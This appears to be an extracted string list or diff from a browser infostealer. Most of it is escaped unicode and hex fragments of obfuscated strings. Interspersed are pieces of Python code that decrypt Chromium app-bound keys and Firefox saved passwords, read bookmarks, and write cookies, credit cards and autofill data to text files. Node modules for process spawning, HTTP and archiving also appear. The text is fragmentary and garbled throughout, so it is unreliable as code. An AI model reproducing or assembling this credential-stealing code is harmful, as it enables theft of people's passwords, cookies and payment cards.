+\\u0047\
+\\u0048\
+\\u0049\
+\\u004b\
+\\u004b\\u0073\\u0057\\u0059\\u0061\\u007c\\u0077\\u0075\
+\\u004c\\u0042\\u005d\\u0074\\u0050\\u005a\\u007c\\u005f\
+\\u004c\\u0068\\u0064\\u0078\\u0046\\u007c\\u002e\
+\\u004e\
+\\u004f\\u006a\\u007c\\u0069\\u0066\\u0057\\u002c\\u0075\
+\\u004f\\u006e\\u004b\\u006d\\u002a\\u0073\\u0033\\u007c\\u0033\
+\\u004f\\u006e\\u004b\\u006d\\u002a\\u0073\\u0033\\u007c\\u0079\\u0044\\u0067\\u0026\\u003f\\u006b\\u006e\\u0023\\u0056\\u0075\\u002a\\u004e\\u0039\\u004b\\u0021\\u006d\\u0034\
+\\u0050\
+\\u0050\\u005d\\u007c\\u007a\\u0076\\u005d\\u0059\\u0065\
+\\u0051\\u0045\\u007c\\u005e\\u004e\\u003a\\u0026\\u0035\\u007c\\u002f\
+\\u0051\\u0045\\u007c\\u005e\\u004e\\u003a\\u0030\\u0034\
+\\u0053\\u0053\\u0026\\u003c\\u004f\\u007b\\u007c\\u0033\\u0042\\u0058\\u0073\\u0053\\u0041\\u0059\\u0063\\u0064\\u0069\\u003b\\u0055\\u002f\
+\\u0054\
+\\u0056\
+\\u0057\
+\\u0057\\u003b\\u0079\\u0059\\u007c\\u005b\\u002c\\u0075\
+\\u0057\\u003b\\u007c\\u005e\\u0056\\u0036\\u002e\\u0075\
+\\u0059\
+\\u0059\\u003b\\u007c\\u005e\\u003b\\u0061\\u007a\\u0034\
+\\u005a\
+\\u005a\\u005a\\u007c\\u003f\\u0025\\u002f\\u0033\\u0047\
+\\u005a\\u0066\\u006e\\u0040\\u0056\\u0036\\u007d\\u002c\\u002f\\u0056\\u005f\\u0076\\u004b\\u0057\\u007c\\u0078\\u0031\\u0026\\u0047\\u0062\\u005f\\u005b\\u004f\\u0048\\u007c\\u005e\
+\\u005c\\u0022\
+\\u005d\\u0028\
+\\u005d\\u003c\\u007c\\u005e\\u0078\\u002b\\u0048\\u0034\
+\\u005f\
+\\u0060\
+\\u0060\\u000a\
+\\u0060\\u0055\\u006b\\u007d\\u006e\\u004a\\u0052\\u0057\\u007c\\u0031\\u0065\\u0053\\u004a\\u0045\\u0042\
+\\u0060\\u005a\\u0037\\u0062\\u0032\\u003a\\u0062\\u007c\
+\\u0060\\u006a\\u0023\\u0056\\u005a\\u0074\\u006e\\u0055\\u006e\\u007d\\u0077\\u006f\\u007c\\u003b\\u0030\\u0021\\u004b\\u0030\\u0021\\u003c\\u0050\\u0047\\u0062\\u0075\
+\\u0061\\u0063\
+\\u0061\\u006e\
+\\u0062\\u0073\
+\\u0063\\u0032\\u0061\\u0034\\u004f\\u0039\\u007c\\u005f\\u0077\\u0034\\u004f\\u0039\\u007c\\u005f\\u0077\\u0034\\u004f\\u0039\\u007c\\u005f\\u0077\\u0034\\u003b\
+\\u0063\\u003b\\u007c\\u005e\\u004a\\u0039\\u0054\\u0066\\u005d\
+\\u0063\\u0065\
+\\u0063\\u0068\
+\\u0064\
+\\u0064\\u0056\\u003c\\u007a\\u007c\
+\\u0064\\u0063\\u0067\\u0030\\u003b\\u0057\\u007c\\u005d\
+\\u0065\\u003a\
+\\u0065\\u0064\
+\\u0065\\u0072\
+\\u0065\\u0073\
+\\u0065\\u0074\
+\\u0066\
+\\u0066\\u002e\\u006b\\u0032\\u0049\\u0039\\u0045\\u0069\\u005d\\u007c\\u0079\
+\\u0066\\u006f\
+\\u0067\\u0045\\u007c\\u005e\\u004e\\u003a\\u0030\\u0034\
+\\u0067\\u0045\\u007c\\u005e\\u0074\\u003a\\u0057\\u0034\
+\\u0067\\u0045\\u007c\\u005e\\u0078\\u002b\\u0057\\u0034\
+\\u0067\\u0078\
+\\u0068\\u007b\\u0074\\u0065\\u0028\\u0062\\u007c\\u005f\
+\\u0069\\u0029\\u0068\\u0062\\u002a\\u0028\\u0035\\u0032\\u007c\\u005e\\u006c\\u0065\\u0056\\u0034\\u002b\\u0035\
+\\u0069\\u006f\
+\\u006b\
+\\u006b\\u002e\\u003e\\u005e\\u006f\\u0028\\u007a\\u0068\\u0039\\u007c\\u0054\\u004c\\u003f\\u0031\\u0057\\u007b\\u004f\\u002c\\u003f\\u0028\\u0079\\u0040\\u005f\
+\\u006b\\u007b\\u0064\\u004b\\u0075\\u0022\\u0050\\u0037\\u0039\\u007c\\u007c\\u0071\\u0040\\u003c\\u003c\
+\\u006c\
+\\u006c\\u0029\
+\\u006c\\u006c\\u0042\\u0069\\u0067\\u0053\\u0063\\u003a\\u0052\\u0047\\u007c\\u0046\\u0078\
+\\u006d\
+\\u006d\\u0065\
+\\u006e\\u0039\\u004d\\u007c\\u0066\\u0069\\u006b\\u003d\
+\\u006e\\u0064\
+\\u006f\
+\\u006f\\u0031\
+\\u006f\\u0048\\u005e\\u0028\\u0069\\u0074\\u0055\\u0041\\u0065\\u007c\\u0035\\u0066\\u005d\\u0031\\u0054\\u0023\
+\\u006f\\u006e\
+\\u006f\\u0074\
+\\u0070\
+\\u0070\\u0060\\u0069\\u0038\\u0067\\u0065\\u007c\\u005f\
+\\u0070\\u0074\\u0024\\u0071\\u0035\\u0068\\u007c\\u0042\
+\\u0072\\u003a\
+\\u0072\\u0064\
+\\u0072\\u0065\
+\\u0072\\u006c\
+\\u0072\\u0073\
+\\u0072\\u0079\
+\\u0073\\u0065\
+\\u0073\\u0078\
+\\u0074\\u0068\
+\\u0075\\u003c\\u007c\\u005e\\u003f\\u0061\\u0055\\u0034\
+\\u0075\\u0070\
+\\u0076\
+\\u0077\\u0065\\u007c\\u0077\\u0076\\u007b\\u003f\\u0075\
+\\u0077\\u007b\\u0052\\u007d\\u007c\\u0052\\u0079\\u0034\\u0037\\u005d\\u0072\\u0045\\u0041\\u0064\\u0068\\u0048\
+\\u0077\\u007b\\u007c\\u0053\\u002c\\u004b\\u0078\\u0034\
+\\u0078\
+\\u0078\\u0065\
+\\u0079\\u0020\
+\\u0079\\u0066\\u0054\\u006e\\u007d\\u0022\\u007c\\u005f\
+\\u007b\\u003b\\u0066\\u0028\\u0038\\u0065\\u005a\\u0063\\u004f\\u007c\\u007c\\u0071\\u0070\\u005b\\u0072\\u0048\\u0052\\u002e\\u003f\\u0028\\u0056\\u005a\\u0044\\u0034\
+\\u007c\\u0031\\u0045\\u0062\\u006b\\u0044\\u004d\\u0063\
+\\u007c\\u0031\\u0045\\u0062\\u0079\\u007a\\u004d\\u0063\
+\\u007c\\u0031\\u006d\\u0052\\u0063\\u0032\\u0062\\u0056\\u0032\\u003d\\u0059\\u0055\\u0064\
+\\u007c\\u0039\\u005e\\u0062\
+\\u007c\\u0040\\u0061\\u002b\\u0037\\u006c\\u0044\\u0050\
+\\u007c\\u0044\\u0039\\u0045\\u0057\\u002c\\u0044\\u0065\
+\\u007c\\u0049\\u0077\\u0040\\u0054\\u0050\\u0050\\u0075\
+\\u007c\\u004f\\u0054\\u0038\\u0052\\u002b\\u005f\
+\\u007c\\u0059\\u0021\\u0064\\u0054\\u0066\\u004d\\u0072\
+\\u007c\\u0066\\u0025\\u0041\\u0045\
+\\u007c\\u0066\\u0025\\u0041\\u004f\\u002a\\u0067\\u0077\\u002e\
+\\u007c\\u0066\\u0036\\u004f\\u0042\\u004a\\u0079\\u0034\
+\\u007c\\u0066\\u004f\\u004e\\u0044\\u004e\\u007d\\u0063\\u004b\\u0063\\u0073\\u0053\\u0054\\u0055\\u007a\\u0048\\u0021\\u0063\\u0057\\u005e\\u0069\\u004a\\u0075\\u0075\
+\\u007d\
+\\u007d\\u006e\\u002b\\u005e\\u002f\\u0061\\u006e\\u007c\\u0042\\u0041\\u003e\\u004c\\u0076\\u006b\\u006c\\u0023\\u0045\\u004c\\u0031\\u0041\\u0060\\u0053\\u0040\\u0053\\u006f\\u002f\
+\\u007e\\u003d\\u007c\\u004f\\u0049\\u0040\\u0022\\u0075\
+\n                                else:\n                                    value_str = value\n                                line = f\
+\n                                f.write(line)\n                        logger.debug(f\
+\n                                line = f\
+\n                                secure_str = \
+\n                            \n                            if password: success_count += 1\n                            \n                            line = f\
+\n                            f.write(line)\n                    con.close()\n            except Exception as e:\n                logger.error(f\
+\n                            f.write(line)\n                    logger.debug(f\
+\n                            line = f\
+\n                            password = nss_handler.decrypt(encrypted_password) if encrypted_password else \
+\n                            path_str = path if path else \
+\n                            secure_str = \
+\n            SELECT b.title, p.url \n            FROM moz_bookmarks b \n            JOIN moz_places p ON b.fk = p.id \n            WHERE b.type = 1\n        \
+\n            if data_path and data_path.exists():\n                if norm in processed_paths:\n                    continue\n                processed_paths.add(norm)\n            if browser_config[
+\n            xored_aes_key = byte_xor(decrypted_aes_key, xor_key)\n            cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data[
+\n        \n    hKey = gdef.NCRYPT_KEY_HANDLE()\n    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), key_name, 0, 0)\n    if status != 0:\n        logger.error(f\
+\n        \n    ncrypt.NCryptFreeObject(hKey)\n    ncrypt.NCryptFreeObject(hProvider)\n    logger.debug(\
+\n        if not encrypted_password.startswith(b
+\n    \n    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), provider_name, 0)\n    if status != 0:\n        logger.error(f\
+\u000a\u000a�
+\u0020\u0022�
+\u0020\u0027�
+\u0020\u0028�
+\u0020\u0042�
+\u0020\u0060�
+\u0020�
+\u0021\u004c\u0052\u007d\u0029\u0073\u007c\u005f�
+\u0021�
+\u0023�
+\u0024\u003c\u007c\u005e\u006e\u004a\u0079\u0034�
+\u0025\u004e\u0035\u0032\u006b\u007c\u0044\u0068\u0028\u0055�
+\u0026\u0031�
+\u0026�
+\u0027\u0022�
+\u0028\u0061\u0022\u0029\u0030\u0039\u003e\u0078\u003c\u007c\u0053\u0062\u0022\u003c\u0030\u005b�
+\u0028\u006a\u007c\u005e\u0077\u004a\u0055\u0034�
+\u0028�
+\u0029\u003a�
+\u002a\u007e\u0046\u0079\u0074\u003c\u007c�
+\u002b\u005e\u002e\u0028\u0078\u005a\u007c\u0068\u0046\u0035\u0065\u0065\u0075�
+\u002b\u005e\u002e\u0028\u0078\u005a\u007c\u0068\u0046\u0035�
+\u002b\u0071\u0026\u007c\u0031\u006b\u0079\u0063�
+\u002c\u003b\u002f\u0056\u0071\u0052\u0044\u0073\u007c\u002f�
+\u002d\u006d�
+\u002d\u0076�
+\u002e\u002e�
+\u0030�
+\u0031�
+\u0032\u0055\u007a\u0032\u007c\u0076\u0044\u0034�
+\u0032�
+\u0033\u0037�
+\u0033�
+\u0034\u0035�
+\u0034\u003e�
+\u0034\u0072�
+\u0034�
+\u0036\u004f\u006b\u0032\u0072\u0026\u004b\u0061\u0058\u0031\u007c\u0065\u0076\u006b\u0024�
+\u0036\u006a\u002b\u006e\u003a\u005a\u0051\u002b\u0055\u0049\u007c\u007a\u004a\u0047\u002c\u0036\u0065\u0046\u007a\u007d\u0042\u0061\u0044\u0034�
+\u0036�
+\u0037\u0031\u0060\u006e\u0025\u003e\u0062\u0063\u0048\u003f\u004e\u007c\u004d�
+\u0037\u0060\u0069\u004e\u0033\u0036\u007c\u005f�
+\u0037�
+\u0038�
+\u0039\u007c\u0036\u0074\u006c\u0030\u005b\u0061�
+\u003a\u0020�
+\u003a\u0039\u007a\u007d\u0025\u0076\u007c\u005f�
+\u003a�
+\u003c\u005e\u004e\u0062\u0051\u0048\u006e\u0055\u0071\u0066\u0065\u0053\u007c\u003b\u0060\u0047\u0046\u0055\u006c\u0028\u003b�
+\u003d\u003d\u003d�
+\u003d\u003d�
+\u003d�
+\u003f�
+\u0040\u007e\u0070\u0055\u0050\u0039\u0043\u007a\u0033\u007c\u0055\u0072\u0046\u0075�
+\u0041�
+\u0043\u005b\u007c\u007a\u005e\u0078\u0055\u0065�
+\u0043\u0067\u0047\u004e\u0052\u004b\u007c\u005f�
+\u0043\u0067\u007a\u007d\u005a\u005a\u007c\u005f�
+\u0044�
+\u0045\u0031\u006e\u007c\u0073\u0047\u0031\u0036�
+\u0047�
+\u0048�
+\u0049�
+\u004b\u0073\u0057\u0059\u0061\u007c\u0077\u0075�
+\u004b�
+\u004c\u0042\u005d\u0074\u0050\u005a\u007c\u005f�
+\u004c\u0068\u0064\u0078\u0046\u007c\u002e�
+\u004e�
+\u004f\u006a\u007c\u0069\u0066\u0057\u002c\u0075�
+\u004f\u006e\u004b\u006d\u002a\u0073\u0033\u007c\u0033�
+\u004f\u006e\u004b\u006d\u002a\u0073\u0033\u007c\u0079\u0044\u0067\u0026\u003f\u006b\u006e\u0023\u0056\u0075\u002a\u004e\u0039\u004b\u0021\u006d\u0034�
+\u0050\u005d\u007c\u007a\u0076\u005d\u0059\u0065�
+\u0050�
+\u0051\u0045\u007c\u005e\u004e\u003a\u0026\u0035\u007c\u002f�
+\u0051\u0045\u007c\u005e\u004e\u003a\u0030\u0034�
+\u0053\u0053\u0026\u003c\u004f\u007b\u007c\u0033\u0042\u0058\u0073\u0053\u0041\u0059\u0063\u0064\u0069\u003b\u0055\u002f�
+\u0054�
+\u0056�
+\u0057\u003b\u0079\u0059\u007c\u005b\u002c\u0075�
+\u0057\u003b\u007c\u005e\u0056\u0036\u002e\u0075�
+\u0057�
+\u0059\u003b\u007c\u005e\u003b\u0061\u007a\u0034�
+\u0059�
+\u005a\u005a\u007c\u003f\u0025\u002f\u0033\u0047�
+\u005a\u0066\u006e\u0040\u0056\u0036\u007d\u002c\u002f\u0056\u005f\u0076\u004b\u0057\u007c\u0078\u0031\u0026\u0047\u0062\u005f\u005b\u004f\u0048\u007c\u005e�
+\u005a�
+\u005c\u0022�
+\u005d\u0028�
+\u005d\u003c\u007c\u005e\u0078\u002b\u0048\u0034�
+\u005f�
+\u0060\u000a�
+\u0060\u0055\u006b\u007d\u006e\u004a\u0052\u0057\u007c\u0031\u0065\u0053\u004a\u0045\u0042�
+\u0060\u005a\u0037\u0062\u0032\u003a\u0062\u007c�
+\u0060\u006a\u0023\u0056\u005a\u0074\u006e\u0055\u006e\u007d\u0077\u006f\u007c\u003b\u0030\u0021\u004b\u0030\u0021\u003c\u0050\u0047\u0062\u0075�
+\u0060�
+\u0061\u0063�
+\u0061\u006e�
+\u0062\u0073�
+\u0063\u0032\u0061\u0034\u004f\u0039\u007c\u005f\u0077\u0034\u004f\u0039\u007c\u005f\u0077\u0034\u004f\u0039\u007c\u005f\u0077\u0034\u003b�
+\u0063\u003b\u007c\u005e\u004a\u0039\u0054\u0066\u005d�
+\u0063\u0065�
+\u0063\u0068�
+\u0064\u0056\u003c\u007a\u007c�
+\u0064\u0063\u0067\u0030\u003b\u0057\u007c\u005d�
+\u0064�
+\u0065\u003a�
+\u0065\u0064�
+\u0065\u0072�
+\u0065\u0073�
+\u0065\u0074�
+\u0066\u002e\u006b\u0032\u0049\u0039\u0045\u0069\u005d\u007c\u0079�
+\u0066\u006f�
+\u0066�
+\u0067\u0045\u007c\u005e\u004e\u003a\u0030\u0034�
+\u0067\u0045\u007c\u005e\u0074\u003a\u0057\u0034�
+\u0067\u0045\u007c\u005e\u0078\u002b\u0057\u0034�
+\u0067\u0078�
+\u0068\u007b\u0074\u0065\u0028\u0062\u007c\u005f�
+\u0069\u0029\u0068\u0062\u002a\u0028\u0035\u0032\u007c\u005e\u006c\u0065\u0056\u0034\u002b\u0035�
+\u0069\u006f�
+\u006b\u002e\u003e\u005e\u006f\u0028\u007a\u0068\u0039\u007c\u0054\u004c\u003f\u0031\u0057\u007b\u004f\u002c\u003f\u0028\u0079\u0040\u005f�
+\u006b\u007b\u0064\u004b\u0075\u0022\u0050\u0037\u0039\u007c\u007c\u0071\u0040\u003c\u003c�
+\u006b�
+\u006c\u0029�
+\u006c\u006c\u0042\u0069\u0067\u0053\u0063\u003a\u0052\u0047\u007c\u0046\u0078�
+\u006c�
+\u006d\u0065�
+\u006d�
+\u006e\u0039\u004d\u007c\u0066\u0069\u006b\u003d�
+\u006e\u0064�
+\u006f\u0031�
+\u006f\u0048\u005e\u0028\u0069\u0074\u0055\u0041\u0065\u007c\u0035\u0066\u005d\u0031\u0054\u0023�
+\u006f\u006e�
+\u006f\u0074�
+\u006f�
+\u0070\u0060\u0069\u0038\u0067\u0065\u007c\u005f�
+\u0070\u0074\u0024\u0071\u0035\u0068\u007c\u0042�
+\u0070�
+\u0072\u003a�
+\u0072\u0064�
+\u0072\u0065�
+\u0072\u006c�
+\u0072\u0073�
+\u0072\u0079�
+\u0073\u0065�
+\u0073\u0078�
+\u0074\u0068�
+\u0075\u003c\u007c\u005e\u003f\u0061\u0055\u0034�
+\u0075\u0070�
+\u0076�
+\u0077\u0065\u007c\u0077\u0076\u007b\u003f\u0075�
+\u0077\u007b\u0052\u007d\u007c\u0052\u0079\u0034\u0037\u005d\u0072\u0045\u0041\u0064\u0068\u0048�
+\u0077\u007b\u007c\u0053\u002c\u004b\u0078\u0034�
+\u0078\u0065�
+\u0078�
+\u0079\u0020�
+\u0079\u0066\u0054\u006e\u007d\u0022\u007c\u005f�
+\u007b\u003b\u0066\u0028\u0038\u0065\u005a\u0063\u004f\u007c\u007c\u0071\u0070\u005b\u0072\u0048\u0052\u002e\u003f\u0028\u0056\u005a\u0044\u0034�
+\u007c\u0031\u0045\u0062\u006b\u0044\u004d\u0063�
+\u007c\u0031\u0045\u0062\u0079\u007a\u004d\u0063�
+\u007c\u0031\u006d\u0052\u0063\u0032\u0062\u0056\u0032\u003d\u0059\u0055\u0064�
+\u007c\u0039\u005e\u0062�
+\u007c\u0040\u0061\u002b\u0037\u006c\u0044\u0050�
+\u007c\u0044\u0039\u0045\u0057\u002c\u0044\u0065�
+\u007c\u0049\u0077\u0040\u0054\u0050\u0050\u0075�
+\u007c\u004f\u0054\u0038\u0052\u002b\u005f�
+\u007c\u0059\u0021\u0064\u0054\u0066\u004d\u0072�
+\u007c\u0066\u0025\u0041\u0045�
+\u007c\u0066\u0025\u0041\u004f\u002a\u0067\u0077\u002e�
+\u007c\u0066\u0036\u004f\u0042\u004a\u0079\u0034�
+\u007c\u0066\u004f\u004e\u0044\u004e\u007d\u0063\u004b\u0063\u0073\u0053\u0054\u0055\u007a\u0048\u0021\u0063\u0057\u005e\u0069\u004a\u0075\u0075�
+\u007d\u006e\u002b\u005e\u002f\u0061\u006e\u007c\u0042\u0041\u003e\u004c\u0076\u006b\u006c\u0023\u0045\u004c\u0031\u0041\u0060\u0053\u0040\u0053\u006f\u002f�
+\u007d�
+\u007e\u003d\u007c\u004f\u0049\u0040\u0022\u0075�
+\x0a�
+\x0d\x0a�
+\x22\x20�
+\x22�
+\x23\x3b\x7c\x5e�
+\x25\x64\x33\x4e\x69\x4a\x7c\x5f�
+\x26\x26\x75\x29\x29\x39\x7c\x5f�
+\x26\x49\x49\x62\x24\x7c\x2f\x75�
+\x27�
+\x28\x6a\x7c\x5e�
+\x29�
+\x2a\x2a�
+\x2a\x6e\x7c\x2e\x43\x4b\x65\x7a\x4b\x63�
+\x2d�
+\x2e�
+\x2f\x22\x59\x32\x4d\x48\x7c\x5f�
+\x32\x33�
+\x32\x3b\x67\x69\x2f\x61\x64\x24\x38\x7c\x25\x71\x4c\x62\x4c\x28\x51\x45\x7c\x5e\x4e\x3a\x26\x35\x57\x54\x6b\x61\x29\x59\x54\x23\x6a\x67\x2e�
+\x32\x6a\x2f\x56\x24\x74\x62\x75\x5f\x33\x73\x71\x7e\x6f\x61\x47\x40\x72\x46\x3c\x47\x65\x25\x2b\x62\x58\x69\x76\x7c\x6d\x75\x55\x47\x42\x62\x41�
+\x32\x6c\x77\x67\x39\x69\x78\x32\x34\x60\x29\x2e\x76\x65\x61\x7c\x64\x45\x76\x41\x4b\x4b\x6a�
+\x32\x77\x2b\x3c\x5e\x33\x53\x4d\x7c�
+\x33\x3c\x7c\x5e\x4e\x3a\x5b\x34�
+\x33\x46\x6e\x4e\x3b\x5a\x23\x24\x33\x7c\x40\x58\x30\x3c�
+\x35�
+\x36\x22\x7e\x66\x3c\x29\x7c\x5f�
+\x36\x2e\x2f\x38\x7b\x3a\x3e\x79\x6c\x41\x60\x3e\x50\x23\x7c\x78\x67\x6c\x32\x3c\x59\x23\x5e\x75�
+\x37\x31�
+\x37\x38�
+\x37\x41\x77\x34\x2c\x3a\x23\x5a\x33\x7c\x34\x6d\x6b\x45\x69\x3f�
+\x37\x60\x69\x4e\x42\x5a\x7c\x5f�
+\x37\x60\x7c\x5e\x26\x3e\x3d\x2b\x33�
+\x38\x58\x5b\x24\x63\x40\x58\x7c�
+\x3a\x65\x46\x7a\x5a\x74\x29\x55\x7c\x5e�
+\x3b\x3b\x42\x38\x7c\x5a\x79\x34�
+\x3c\x44\x52\x7d\x29\x73\x7b\x34\x7b\x7c\x30\x26\x6f\x29\x42�
+\x3c\x5e\x78\x59\x4b\x47\x5d\x35\x75\x58\x63\x2b\x54\x24\x6e\x63\x31\x5e\x5f\x5e\x3f\x47\x29\x48\x33\x38\x22\x3e\x34\x65\x7c\x78\x2e\x5e\x76\x62\x46\x46\x5f�
+\x3c\x73\x6c\x45\x2e\x50\x7c\x68\x3d\x63�
+\x3f\x4c\x4a\x4b\x7c\x76\x55\x34�
+\x42�
+\x43\x7c\x36\x7a\x76\x4c\x79\x5f\x25\x59�
+\x43�
+\x44\x6f\x7c\x5e\x28\x4a\x4c\x34�
+\x44\x75\x32\x4b\x4d\x6b\x37\x2b\x4f\x7c\x3b\x66\x71\x67\x63\x42�
+\x45\x52�
+\x45\x6a\x7c\x5e\x28\x4a\x47\x34�
+\x45�
+\x46�
+\x47\x45\x24\x56\x57\x4b\x65\x7a\x7c\x2f�
+\x49\x53�
+\x4a�
+\x4c\x5a\x53\x74\x72\x69\x6e\x67�
+\x4c\x6e\x2b\x5e\x2f\x61\x6e\x7c\x3b\x7d\x24\x79\x3a\x62\x3b\x64\x2b\x4f\x34�
+\x4c\x6e\x61\x34\x42\x3a\x6e\x7a\x47\x7c\x45\x22\x5d\x3b\x77\x47�
+\x4c\x6e\x7c\x28\x48\x3e\x57\x34�
+\x4c�
+\x4d�
+\x4e\x3b\x7c\x5e\x65\x7d\x44\x34�
+\x4e\x48�
+\x4f\x48\x4c\x62\x7d\x7b\x77\x50\x60\x41\x3d\x7c\x42\x2f\x4a\x46\x55\x75�
+\x4f�
+\x51�
+\x52\x22\x7c\x5e\x74\x3a\x79\x57\x33�
+\x52\x45\x7c\x6b\x7b\x36\x60\x72\x57\x7e\x2a\x3c\x7a\x52\x4d\x5d\x4e\x22\x2c\x3d�
+\x52\x5b\x33\x4b\x2f\x36\x7c\x5f�
+\x52\x6e\x61\x28\x47\x46\x5f\x41\x77\x3f\x4c\x2b\x6a\x6b\x4e\x60\x39\x4f\x44\x32\x5d\x50\x7a\x7a\x2c\x7c\x5e\x73\x32\x3c\x56�
+\x52�
+\x53\x53\x48\x59\x7c\x5b\x2c\x75�
+\x53�
+\x54\x51\x7c\x5e\x44\x6e\x74\x2c\x24\x49\x56\x54\x75\x43\x7d\x48\x51\x75\x42\x62\x29\x66\x3d\x3f\x50\x67\x77\x75\x5b\x6c\x6d\x59\x45\x46\x41\x33�
+\x54\x6c\x7d\x3c\x29\x64\x4e\x32\x63\x4f\x43\x2b\x76\x57\x7c\x78\x51\x22\x63\x76\x3f\x47\x60\x55\x28\x5e\x38\x65\x2b\x24\x46\x35�
+\x55\x31\x67\x7c\x50\x3f\x23\x63�
+\x55\x73\x4c\x62\x54\x39\x2a\x68\x75\x6f\x54\x7a\x62\x76\x2c\x7b\x57\x3b\x72\x77\x3c\x36\x7c\x5f\x2e�
+\x55�
+\x58\x5e\x6b\x41\x25\x4e\x65\x55\x55\x22\x37\x65\x67\x5b\x52\x48\x28\x6a\x7c\x5e\x60\x79\x77\x2b\x77\x63�
+\x58�
+\x59\x3b\x7c\x5e\x28\x4a\x29\x34�
+\x59\x6f\x7c\x5e\x51�
+\x5a\x64\x2f\x3c\x59\x5d\x7c\x5f\x77\x34\x41�
+\x5b\x66\x7a\x40\x6a\x3e\x7c\x5f�
+\x5c\x5c�
+\x5c�
+\x60\x55\x3b\x4b\x58\x52\x7c\x5f�
+\x61\x62�
+\x61\x63�
+\x61\x6c\x69\x3c\x47\x3e\x5b\x78\x50\x7d\x7c\x21\x35\x42\x2e\x63\x5f\x4f\x7d\x3c\x28\x4a\x53\x36\x6d\x41�
+\x62\x2f\x5a\x4e\x6a\x5e\x61\x7c\x4d\x6c\x7e\x62\x64�
+\x62\x45\x7c\x5e\x32�
+\x62\x48\x25\x28\x21\x4b\x7c\x5f�
+\x62�
+\x63\x32\x61\x34\x4f\x39\x7c\x5f\x77\x34\x4f\x39\x5f�
+\x63\x3b\x66\x28\x79\x40\x6e\x69\x7c\x31\x51\x5d\x75�
+\x63�
+\x65\x46\x7a\x7d\x67\x65\x7c\x5f�
+\x65\x5c�
+\x65\x63�
+\x65\x6d�
+\x65�
+\x66\x75\x6e\x63\x74\x69\x6f\x6e�
+\x67\x26\x48\x59\x7c\x5b\x2a\x48\x2a\x7d\x45�
+\x67\x73�
+\x67�
+\x68\x4a\x7c\x4d\x71\x21\x47\x39�
+\x68�
+\x69\x3b\x7c\x5e\x3b\x61\x47\x34�
+\x69\x70�
+\x69\x73�
+\x69�
+\x6a�
+\x6c\x29�
+\x6c\x6c�
+\x6d\x3a�
+\x6d\x67\x7c\x6d\x5b\x25\x31�
+\x6d\x73�
+\x6e\x3a\x3c\x75\x7c\x61\x3b\x48�
+\x6e\x63�
+\x6e\x65�
+\x6e\x67�
+\x6e\x6b�
+\x6e\x73�
+\x6e\x74�
+\x6e�
+\x6f\x5c�
+\x6f\x5e\x66\x41\x3b\x61\x35\x5a\x7c\x31\x4e\x26\x26\x75�
+\x6f\x6b�
+\x6f\x6d�
+\x6f\x75�
+\x70\x0a�
+\x70\x22\x53\x4f\x79\x65\x7c\x5f�
+\x72\x6d�
+\x72�
+\x73\x74�
+\x73�
+\x74\x3a�
+\x74\x65�
+\x74\x6f�
+\x74\x73�
+\x74\x79�
+\x74�
+\x75\x49\x6a\x41\x7c�
+\x75\x74�
+\x75�
+\x76\x29\x7a\x52\x7e\x55\x62\x56\x60\x59\x7c\x69\x4d�
+\x76\x4e\x68\x55\x2c\x75\x36\x7c\x73\x36\x3f\x6f\x74\x70�
+\x76\x65�
+\x78\x74�
+\x79�
+\x7a\x65�
+\x7a�
+\x7b\x67\x5e\x33\x74\x4a\x7c\x5f�
+\x7b\x74\x5d\x7c\x3a\x38\x5b\x3d�
+\x7c\x2a\x6a\x68\x72\x38\x57\x35\x69�
+\x7c\x3e\x69\x3e\x2b\x25\x43\x34�
+\x7c\x44\x5f\x2e�
+\x7c\x46\x33\x4e\x39\x4b\x5f�
+\x7c\x4f\x63\x3a\x5a\x5a\x74\x77\x7c\x31\x38\x7a\x56\x2f\x3c�
+\x7c\x59\x7d\x42\x46\x2c\x5f\x36�
+\x7c\x5e\x66\x28\x6e\x4a\x47\x34�
+\x7c\x5e\x74\x65\x69\x3a\x43\x5b\x62\x58\x7a\x26\x5d\x3b\x24�
+\x7c\x5e\x74\x65\x69\x3a\x47\x34�
+\x7c\x66\x5e\x4f\x32�
+\x7c\x66\x69\x4e\x36\x3e\x5f�
+\x7c\x73\x43\x69\x79\x4c\x77\x75�
+\x7e\x2f\x26\x6e\x3b\x5a\x23\x24\x33\x7c\x49\x6e\x2e\x47\x4a\x46\x62\x44\x33\x38\x4f\x39\x73\x7b\x56\x63\x24\x77\x36\x3c\x51\x63\x52\x5b\x75�
+\x7e\x42\x7c\x5e\x6c\x79\x43\x34�
+] = buffer.read()\n            \n        return parsed_data\n    except Exception as e:\n        logger.error(f\
+] = buffer.read(1)[0]\n        logger.debug(f\
+] = buffer.read(12)\n            parsed_data[
+] = buffer.read(16)\n        elif parsed_data[
+] = buffer.read(16)\n        else:\n            parsed_data[
+] = buffer.read(32)\n            parsed_data[
+] = buffer.read(header_len)\n        content_len = struct.unpack(
+] == 
+] == 1:\n            aes_key = bytes.fromhex(\
+] == 2:\n            chacha20_key = bytes.fromhex(\
+] == 3:\n            parsed_data[
+] == 3:\n            xor_key = bytes.fromhex(\
+] in (1, 2):\n            parsed_data[
+])\n            return cipher.decrypt_and_verify(parsed_data[
+])\n        elif parsed_data[
+])\n        else:\n            logger.warning(f\
+])\n        logger.debug(f\
+], key_name)\n            if not decrypted_aes_key:\n                logger.error(\
+], parsed_data[
+]:WOu0oo,[CDD_mEC(0x8e5)+Q4Ysb_[0x85b]]:eNBXOg8,[CDD_mEC(0x8e6)]:CrtODJF}=Jb9zeM2[\
+]:WOu0oo,[CDD_mEC(0x8e5)+Q4Ysb_[0x85b]]:eNBXOg8,[CDD_mEC(0x8e6)]:CrtODJF}=Jb9zeM2[�
+]:\n                            hostname = login.get(\
+]:\n            logger.debug(\
+]\n        local_state_path = os.path.join(user_profile, browser_config[
+adm-zip\
+adm-zip�
+ahVjQrC\
+ahVjQrC�
+app_bound_encrypted_key
+app_bound_encrypted_key\
+app_bound_encrypted_key�
+archiver\
+archiver�
+auto_fills.txt\
+auto_fills.txt�
+axios\
+axios�
+b5J1XM\
+b5J1XM�
+big-integer\
+big-integer�
+bookmarks.txt\
+bookmarks.txt�
+brave
+brave.exe
+browser.exe
+cert8.db\
+cert8.db�
+cert9.db\
+cert9.db�
+child_process\
+child_process�
+children\
+children�
+chrome
+chrome.exe
+chrome_beta
+chromium
+coccoc
+cookies.sqlite\
+cookies.sqlite�
+cookies.txt\
+cookies.txt�
+cp1252
+credit_cards.txt\
+credit_cards.txt�
+crypto\
+crypto�
+data
+data_path
+edge
+encrypted_key\
+encrypted_key�
+firefox
+firefox.exe
